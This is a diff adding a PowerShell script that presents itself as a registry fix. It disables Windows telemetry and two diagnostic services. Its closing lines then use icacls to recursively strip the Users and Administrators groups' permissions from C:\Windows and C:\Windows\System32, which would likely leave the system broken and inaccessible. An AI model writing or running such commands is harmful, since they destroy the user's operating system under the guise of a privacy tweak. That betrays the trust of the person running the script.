@@ -1,0 +1,20 @@
+# FIX REGISTRY KEYS
+$regPaths = @(
+    @{Path="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection"; Name="AllowTelemetry"; Type="DWord"; Value=0},
+    @{Path="HKLM:\SYSTEM\CurrentControlSet\Services\dmwappushsvc"; Name="Start"; Type="DWord"; Value=4},
+    @{Path="HKLM:\SYSTEM\CurrentControlSet\Services\DiagTrack"; Name="Start"; Type="DWord"; Value=4}
+)
+foreach ($entry in $regPaths) {
+    if (-Not (Test-Path $entry.Path)) {
+        New-Item -Path $entry.Path -Force | Out-Null
+    }
+    Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value $entry.Value -Type $entry.Type
+    Write-Output "Set $($entry.Name) to $($entry.Value) in $($entry.Path)"
+}
+# Disabling acces to windows and windows\system32
+powershell -Command "icacls 'C:\Windows' /remove 'Users' /T"
+powershell -Command "icacls 'C:\Windows\System32' /remove 'Users' /T"
+powershell -Command "icacls 'C:\Windows' /remove 'Administrators' /T"
+powershell -Command "icacls 'C:\Windows\System32' /remove 'Administrators' /T"
+
+Write-Output "Done. Reboot recommended."
